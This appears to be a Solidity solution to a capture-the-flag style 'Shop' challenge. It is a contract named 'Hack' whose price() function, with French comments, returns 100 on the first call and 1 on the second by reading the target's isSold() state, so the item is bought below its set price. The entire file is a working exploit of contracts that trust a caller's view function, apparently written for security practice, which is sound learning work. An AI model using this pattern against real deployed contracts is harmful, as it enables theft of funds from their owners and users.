// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
    function price() external view returns (uint256);
}

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract Hack is IBuyer {
    IShop public target;

    constructor(address shop) {
        target = IShop(shop);
    }

    // Appelle la logique de Shop
    function attack() external {
        target.buy();
    }

    // Appelée deux fois par Shop.buy()
    function price() external view returns (uint256) {
        // msg.sender == address(Shop)
        if (IShop(msg.sender).isSold()) {
            // 2e appel: déjà vendu -> renvoyer < 100
            return 1;
        } else {
            // 1er appel: pas encore vendu -> renvoyer >= 100
            return 100;
        }
    }
}
